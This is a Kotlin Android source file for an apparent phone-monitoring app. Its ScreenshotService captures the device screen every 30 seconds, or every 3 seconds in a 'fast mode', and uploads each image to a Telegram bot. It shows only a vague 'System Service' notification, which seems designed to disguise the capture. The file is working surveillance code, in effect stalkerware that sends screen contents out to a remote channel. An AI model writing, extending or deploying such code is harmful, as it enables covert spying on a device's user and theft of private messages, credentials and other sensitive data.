package com.dec.monitor.screen

import android.app.*
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.dec.monitor.Config
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class ScreenshotService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private var screenshotRunnable: Runnable? = null

    companion object {
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        var fastMode = false  // when true: 3s interval, when false: 30s
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(2, buildNotification())

        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
            ?: return START_NOT_STICKY
        val resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra(EXTRA_RESULT_DATA)
        } ?: return START_NOT_STICKY

        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)

        setupVirtualDisplay()
        startScreenshotLoop()

        return START_STICKY
    }

    private fun setupVirtualDisplay() {
        val metrics = resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture", width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, handler
        )
    }

    private fun startScreenshotLoop() {
        screenshotRunnable = object : Runnable {
            override fun run() {
                captureAndSend()
                val interval = if (fastMode) 3_000L else Config.SCREENSHOT_INTERVAL_MS
                handler.postDelayed(this, interval)
            }
        }
        val interval = if (fastMode) 3_000L else Config.SCREENSHOT_INTERVAL_MS
        handler.postDelayed(screenshotRunnable!!, interval)
    }

    private fun captureAndSend() {
        try {
            val image = imageReader?.acquireLatestImage() ?: return
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * resources.displayMetrics.widthPixels

            val bitmap = Bitmap.createBitmap(
                resources.displayMetrics.widthPixels + rowPadding / pixelStride,
                resources.displayMetrics.heightPixels,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()

            val timestamp = SimpleDateFormat("HHmmss_ddMM", Locale.getDefault()).format(Date())
            val file = File(cacheDir, "ss_$timestamp.png")
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 80, out)
            }
            bitmap.recycle()

            val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendPhoto(file, "📱 $time${if (fastMode) " ⚡" else ""}")
            }
        } catch (e: Exception) {
            Log.e("ScreenshotService", "Capture failed: ${e.message}")
        }
    }

    override fun onDestroy() {
        screenshotRunnable?.let { handler.removeCallbacks(it) }
        virtualDisplay?.release()
        mediaProjection?.stop()
        imageReader?.close()
        super.onDestroy()
    }

    private fun buildNotification(): Notification {
        val channelId = "screenshot_service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "Screen Monitor", NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
